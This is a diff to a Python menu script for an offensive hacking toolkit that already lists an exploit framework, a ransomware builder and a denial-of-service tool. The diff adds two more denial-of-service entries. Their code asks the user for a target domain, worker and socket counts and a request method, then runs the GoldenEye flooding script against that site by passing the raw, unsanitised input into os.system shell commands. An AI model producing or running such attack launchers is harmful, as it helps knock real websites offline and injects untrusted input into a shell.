@@ -17,6 +17,8 @@ question = input("""
 (a1). darksploit-framework - Tool to run and create exploits.
 (a2). Ransomware - A tool to create Ransomware.
 (a3). powerdos - Denial-Of-Service tool.
+(a4). GoldenEye - Denial-Of-Service tool.
+(a5). EliteToolKit - Denial-Of-Service tool.
 
 \33[94mDefensive Tools:
 (b1). bitb-framework - Browser in the browser attack framework.
@@ -74,7 +76,44 @@ if question == "a2":
 if question == "a3":
   os.system("clear")
   os.system("powerdos")
-  
+if question == "a4":
+  os.system("clear")
+  useragents = input("Do you want to use the default user agents? (y, or n): ")
+  if useragents == "y":
+    os.system("clear")
+    target = input("Please specify a domain for a target (e.g. https://www.website.com): ")
+    os.system("clear")
+    workers = input("How many workers? (default: 10): ")
+    os.system("clear")
+    sockets = input("How many sockets? (default: 500): ")
+    os.system("clear")
+    method = input("Which method? (get, post, or random): ")
+    os.system("clear")
+    verify = input("Do you want to verify SSL certificate? (True, or False): ")
+    os.system("clear")
+    debug = input("Do you want debug enabled? (True, or False): ")
+    os.system("clear")
+    os.system("python " + os.getcwd() + "/GoldenEye/goldeneye.py " + target + " -w " + workers + " -s " + sockets + " -m " + method + " -n " + verify + " -d " + debug)
+  if useragents == "n":
+    os.system("clear")
+    target = input("Please specify a domain for a target (e.g. https://www.website.com): ")
+    os.system("clear")
+    uafile = input("Please specify a file for user agents: ")
+    os.system("clear")
+    workers = input("How many workers? (default: 10): ")
+    os.system("clear")
+    sockets = input("How many sockets? (default: 500): ")
+    os.system("clear")
+    method = input("Which method? (get, post, or random): ")
+    os.system("clear")
+    verify = input("Do you want to verify SSL certificate? (True, or False): ")
+    os.system("clear")
+    debug = input("Do you want debug enabled? (True, or False): ")
+    os.system("clear")
+    os.system("python " + os.getcwd() + "/GoldenEye/goldeneye.py " + target + " -u " + os.getcwd() + "/" + uafile + " -w " + workers + " -s " + sockets + " -m " + method + " -n " + verify + " -d " + debug)
+if question == "a5":
+  os.system("clear && python " + os.getcwd() + "/EliteToolKit/elitekitv1.py")
+
 if question == "b1":
   os.system("clear")
   os.system("bitb-framework")
